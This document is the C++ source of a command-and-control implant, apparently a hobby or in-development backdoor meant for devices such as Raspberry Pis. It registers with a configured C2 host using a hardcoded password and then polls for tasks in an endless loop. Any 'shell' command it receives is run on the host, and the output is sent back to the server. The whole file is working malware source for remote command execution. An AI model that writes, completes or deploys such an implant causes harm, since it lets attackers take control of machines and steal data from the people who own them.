
// @TODO: implant
#include "config.h"
#include "debug.h"
#include "exec_stream.h"
#include "file_iter.h"
#include "http_client.h"
#include "json.hpp"
#include "json_http.hpp"
#include <cstdio>
#include <cstring>
#include <netdb.h>
#include <stdlib.h>
#include <string>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
using json = nlohmann::json;

// dummy cmmmdn
char *fake_shell() {
  const char out[] = "i am so stealthy";
  char *result = (char *)malloc(sizeof(out));
  memcpy(result, out, sizeof(out));
  return result;
}
#define DEFAULT_CHUNK 4096 * 4096
int handle_shell(const char *cmd_str, json &out) {
  DEBUG_LOG("handle_shell: %s", cmd_str);
  ProcessStream *ps = process_stream_spawn(cmd_str, DEFAULT_CHUNK);
  if (!ps) {
    fprintf(stderr, "Failed to spawn process\n");
    return -1;
  }
  size_t stdout_bytes, stderr_bytes;
  bool stdout_open = true, stderr_open = true;
  // TODO: deal with misc cleanup
  char *stdout_buffer = (char *)malloc(ps->chunk_size + 1);
  char *stderr_buffer = (char *)malloc(ps->chunk_size + 1);
  size_t stdout_total = 0, stderr_total = 0;
  // for roundtrip, use realloc to update buffer
  // otherwise, process chunks
  sleep(1);
  if (stdout_open) {
    if (process_stream_read_chunk(ps, STREAM_STDOUT, stdout_buffer,
                                  &stdout_bytes)) {
      if (stdout_bytes > 0) {
        stdout_total += stdout_bytes;
      }
    } else {
      stdout_open = false;
      DEBUG_LOG("STDOUT stream closed\n");
    }
  }

  if (stderr_open) {
    if (process_stream_read_chunk(ps, STREAM_STDERR, stderr_buffer,
                                  &stderr_bytes)) {
      if (stderr_bytes > 0) {
        stderr_total += stderr_bytes;
      }
    } else {
      stderr_open = false;
      DEBUG_LOG("STDERR stream closed\n");
    }
  }

  if (process_stream_has_exited(ps)) {
    int exit_status;
    if (process_stream_get_exit_status(ps, &exit_status)) {
      DEBUG_LOG("Process has exited with status: %d\n", exit_status);
    }
  }
  stdout_buffer[stdout_total] = 0;
  stderr_buffer[stderr_total] = 0;
  // ASSUMING output i string
  // TODO: add std error
  std::string res =
      std::string((char *)stderr_buffer) + std::string((char *)stdout_buffer);

  out["result"] = res;
  DEBUG_LOG("shell reuslts: %s", (char *)res.c_str());
  out["status"] = "ok";
  // memset(stdout_buffer, 0, DEFAULT_CHUNK);
  // memset(stdout_buffer, 0, DEFAULT_CHUNK);
  free(stdout_buffer);
  free(stderr_buffer);
  process_stream_close(ps);

  return 0;
}

int handle_task(json chk_data, json &out) {
  DEBUG_LOG("Calling handle task\n");
  if (chk_data.is_null()) {
    DEBUG_LOG("chk_data is null no task to do\n");
    return -1;
  }
  DEBUG_LOG("Calling handle task\n");
  if (chk_data["cmd"].is_null()) {

    DEBUG_LOG("cmd is null: %s\n", chk_data.dump().c_str());
    return -1;
  }
  std::string cmd = chk_data["cmd"].get<std::string>();
  std::string args;
  if (!chk_data["args"].is_null()) {

    args = chk_data["args"].get<std::string>();
  }
  // TODO: use hash like djb to not do lots and lots of strcmp
  if (strcmp("shell", cmd.c_str()) == 0) {
    // char buffer[4096] = {0};
    // sprintf(buffer, "%s %s", cmd.c_str(), args.c_str());
    out["id"] = chk_data["id"];
    handle_shell(args.c_str(), out);
    DEBUG_LOG("TASK_OUT: %s\n", out.dump().c_str());

    DEBUG_LOG("YAY i am a happy pandas\n");
    return 0;
  }
  DEBUG_LOG("There was data. but we didnt find it %s\n ",
            chk_data.dump().c_str());
  return -2;
}

int main() {
  DEBUG_LOG("Starting implant...\n");
  json req_body;
  req_body["password"] = "we_<3_ghost";

  json response_json;

  // Buffer for error messages

  // Make the JSON HTTP request
  int status_code =
      // TODO: fckn piece of shit crashes randomly on pi3 but not Pi4
      make_json_http_request(
          C2_HOST,        // host
          C2_PORT,        // port
          REGISTER_URI,   // path - using the explicit JSON endpoint
          req_body,       // empty JSON object  sends {}
          &response_json, // response JSON object
          10              // timeout in seconds
      );
  if (status_code != 200) {
    DEBUG_LOG("Failed to authenticate: %d\n", status_code);

    return 0;
  }
  size_t session_id = response_json["id"].get<size_t>();
#ifdef DEBUG
  session_id = 1;
  DEBUG_LOG("Warninig: hardcoded sesssion id");
#endif
  // TODO: handle errors
  DEBUG_LOG("body: %s\n, id: %lu", response_json.dump().c_str(), session_id);
  // checkin loop
  char checkin_uri[4096] = {0};
  sprintf(checkin_uri, "%s/%lu", CHECKIN_URI, session_id);
  json task_out = json::object();
  while (1) {
    // TODO: add jitter
    sleep(SLEEP_TIME);
    json checkin_resp_data;
    // Buffer for error messages

    // Make the JSON HTTP request
    int status_code =
        // TODO: fckn piece of shit crashes randomly on pi3 but not Pi4
        make_json_http_request(
            C2_HOST,            // host
            C2_PORT,            // port
            checkin_uri,        // path - using the explicit JSON endpoint
            task_out,           // empty JSON object  sends {}
            &checkin_resp_data, // response JSON object
            10                  // timeout in seconds
        );
    printf("AM I corrupted?\n");
    json resp_data;
    // DEBUG_LOG("TASK_OUT: %s\n", task_out.dump().c_str());
    DEBUG_LOG("ABOUT TO CLEANUP TASK\n");
    task_out = json::object();
    // task_out.clear();
    DEBUG_LOG("CLEANRED UP \n");
    int status = handle_task(checkin_resp_data, task_out);
    //  DEBUG_LOG("TASK_OUT: %s\n", task_out.dump().c_str());
    if (status < 0) {
      DEBUG_LOG("Cleared status_out UP \n");
    }
  }
  DEBUG_LOG("Implant shutting down...\n");
  return 0;
}
